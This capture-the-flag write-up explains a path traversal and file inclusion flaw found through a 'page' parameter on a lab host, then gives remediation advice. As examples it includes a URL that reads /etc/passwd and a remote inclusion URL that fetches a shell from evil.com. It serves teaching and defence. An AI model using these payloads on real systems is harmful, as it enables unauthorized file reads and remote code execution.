# Path Traversal & File Inclusion

## How do we find the breach ?

Navigation to pages other than Home seems to depend on the "page" parameter, when trying http://192.168.56.102/index.php?page=test an alert appeared :

```html
<script>
  alert("Wtf ?");
</script>
<!DOCTYPE html>
<html>
  <head>
    <title>BornToSec - Web Section</title>
  </head>
</html>
```

When trying a few levels of relative paths, an alert message was displayed each time as a hint, and the flag was captured.

## Vulnerability Identified

- Path Traversal (or Directory Traversal) : Manipulating file paths to access files (config files, sources code, logs...) outside the indented directory.

  Ex: http://site.com?page=../../etc/passwd

- File Inclusion : Abusing a file-include feature to get unauthorized locals files (LFI) or execute malicious external file (EFI).

  Ex: http://site.com?page=http://evil.com/shell.txt

These vulnerabilities are caused by unsanitized user inputs and/or lack of access control to resources.

## Recommended Fix

- Sanitize correctly user input or not use user input directly in file paths.
- Resolve the real path and ensure it stays within an allowed directory.
- Can use a Whitelist-Based File Mapping
